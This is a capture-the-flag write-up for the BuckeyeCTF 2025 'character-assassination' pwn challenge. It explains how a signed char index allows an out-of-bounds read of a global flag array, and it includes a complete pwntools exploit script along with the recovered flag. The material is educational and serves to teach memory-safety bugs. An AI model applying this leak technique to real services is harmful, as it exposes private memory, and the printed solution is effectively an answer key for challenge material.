---
title: "BuckeyeCTF 2025 character-assassination — Full Writeup"
date: 2025-11-10
categories:
  - CtfTime
tags:
  - pwn
  - oob-read
  - data-leak
---

# character-assassination CTF — Full Writeup

This document provides a complete solution for the "character-assassination" pwn challenge from BuckeyeCTF 2025. The goal is to exploit an out-of-bounds (OOB) read vulnerability to leak the contents of a flag stored in the binary's global memory.

## 🧩 Overview

The challenge provides a 64-bit ELF binary and its C source code. The vulnerability is a classic out-of-bounds array read. The program uses a char (which is signed by default on the target system) as an index into an array. By providing byte values greater than 127, we can force the index to be interpreted as a negative number.

Because the flag is stored in a global variable directly before the array we are indexing, we can use this negative index to read the flag, byte by byte, out of memory.

## Phase 1 — Binary Analysis

**Objective:** Understand the vulnerability and the program's memory layout.

**Tools:** `readelf`, Ghidra, or simply reading the provided C source.

Analyzing the C source (character_assassination.c) reveals the key data structures:

```c
char flag[64] = "bctf{fake_flag}";
char upper[] = {
    // ... array data
};
char lower[] = {
    // ... array data
};

int main() {
  // ...
  while (1) {
    // ...
    if (!fgets(input, sizeof(input), stdin)) {
      break;
    }
    for (int i = 0; i < sizeof(input) && input[i]; i++) {
      char c = input[i];
      if (i % 2) {
        printf("%c", upper[c]); // Vulnerable: uses 'upper' array on odd indices
      } else {
        printf("%c", lower[c]); // Uses 'lower' array on even indices
      }
    }
    printf("\n");
  }
}
```

The Vulnerability:
The program uses the input character `c` directly as an index. `c` is a `char`. On most systems, `char` is a signed 8-bit integer (-128 to 127). When we provide a byte value over the network like `0xFF` (255), the program interprets it as the signed integer `-1`.

Memory Layout:
In the data segment, the variables are defined in this order: `flag`, `upper`, `lower`. Because `flag` (64 bytes) is defined immediately before `upper`, the memory looks like this:

[... flag[0] ... flag[63] ][ upper[0] ... upper[n] ...]
         ^                    ^
         |                    |
     &upper - 64          &upper

This means we can access the flag's memory using negative indices from `upper`:

- `upper[-1]` is equivalent to `flag[63]`
- `upper[-2]` is equivalent to `flag[62]`
- ...
- `upper[-64]` is equivalent to `flag[0]`

Our goal is to trigger the `upper[c]` code path (by sending our payload at an odd index) and supply `c` values from `0xFF` (`-1`) down to `0xC0` (`-64`) to leak the entire 64-byte flag.

## Phase 2 — Crafting the Payload

**Objective:** Create a series of payloads to leak the flag one byte at a time.

We will send 64 different payloads in a loop. Each payload will leak one byte of the flag.

Payload Structure:
Each payload will be two bytes long, plus a newline: `b'A' + bytes([exploit_byte]) + b'\n'`

- `b'A'` (Padding): This is at index 0 (an even index). The server will execute `lower['A']`, which prints `a`. We will receive this character and discard it.
- `bytes([exploit_byte])`: This is at index 1 (an odd index). The server will execute `upper[exploit_byte]`, which is our OOB read.

To leak `flag[63]` (at `upper[-1]`), our `exploit_byte` is `0xFF` (255).

To leak `flag[62]` (at `upper[-2]`), our `exploit_byte` is `0xFE` (254).

...

To leak `flag[0]` (at `upper[-64]`), our `exploit_byte` is `0xC0` (192).

Our script will loop `i` from 1 to 64, sending `(256 - i)` as the `exploit_byte`.

## Phase 3 — Exploitation

**Objective:** Send the payloads, read the second byte of each response, and assemble the flag.

We use `pwntools` to connect to the server via SSL. The script's main loop does the following 64 times:

- Construct the two-byte payload `b'A' + bytes([256 - i])`.
- Send the payload with a newline using `sendline()`.
- Wait for the `> ` prompt with `recvuntil(b'> ')`.
- Read and discard the first byte (the junk `a` from `lower['A']`).
- Read and save the second byte (our leaked flag character).

After the loop, the leaked bytes are in reverse order (`flag[63]...flag[0]`), so the script reverses the list and joins them into the final flag.

Exploit Script:

```python
#!/usr/bin/env python3
from pwn import *

# --- Challenge Details ---
HOST = "character-assassination.challs.pwnoh.io"
PORT = 1337

def solve():
    """
    Connects to the server and exploits the OOB read vulnerability.
    """
    # Connect to the remote server with SSL enabled
    # context.log_level = 'debug' # Uncomment for detailed logs
    try:
        p = remote(HOST, PORT, ssl=True)
    except Exception as e:
        log.error(f"Error connecting to {HOST}:{PORT}: {e}")
        return

    leaked_bytes = []
    log.info("Starting flag leak...")

    # We leak 64 bytes, from upper[-1] (flag[63]) down to upper[-64] (flag[0]).
    for i in range(1, 65):
        # Calculate the unsigned byte value for the negative index
        # i=1 -> -1 -> 255 (0xFF) ... i=64 -> -64 -> 192 (0xC0)
        negative_index_byte = (256 - i)

        # Payload: b'A' (even index) + exploit_byte (odd index)
        payload = b'A' + bytes([negative_index_byte])

        # Wait for the prompt
        p.recvuntil(b'> ')
        
        # Send payload (e.g., b'A\xFF\n')
        p.sendline(payload)
        
        # 1. Read the first character, which is the junk 'a'
        first_char = p.read(1)
        
        if first_char != b'a':
            log.error(f"Unexpected response, expected b'a', got: {first_char}")
            break
            
        # 2. Read the second character, which is our flag byte
        leaked_raw_byte = p.read(1)
        if len(leaked_raw_byte) == 0:
            log.error("Connection closed prematurely.")
            break
            
        leaked_bytes.append(leaked_raw_byte[0])
        
        # The next p.recvuntil(b'> ') in the loop will automatically
        # clean up any remaining newlines from the server's output buffer.

    # We leaked the flag in reverse order, so we reverse the list
    leaked_bytes.reverse()

    # Join the bytes and decode
    try:
        # Filter out null bytes and newlines before decoding
        flag = b''.join([bytes([b]) for b in leaked_bytes]).decode('utf-8', 'ignore')
        
        # Clean up common junk from the end
        final_flag = flag.strip().strip('\x00')
        log.success(f"Flag: {final_flag}")

    except Exception as e:
        log.error(f"Failed to decode flag: {e}")
        print(f"Raw leaked bytes (reversed): {leaked_bytes}")

    # Clean up
    p.close()

if __name__ == "__main__":
    solve()
```

## 🏁 Flag

After running the exploit script, it leaks the flag byte by byte, reverses the result, and prints the final flag.

Flag: `bctf{wOw_YoU_sOlVeD_iT_665ff83d}`
